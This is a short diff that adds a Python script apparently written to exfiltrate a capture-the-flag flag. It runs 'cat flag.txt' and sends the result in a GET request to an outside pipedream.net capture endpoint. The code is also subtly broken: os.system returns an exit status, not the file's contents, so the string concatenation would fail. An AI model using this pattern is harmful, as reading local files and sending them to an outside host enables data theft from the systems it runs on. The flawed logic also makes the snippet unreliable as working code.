@@ -1,0 +1,6 @@
+import requests
+import os
+
+result = os.system("cat flag.txt")
+url = "https://eowws6evjz5wggo.m.pipedream.net/?" +result
+response = requests.get(url)
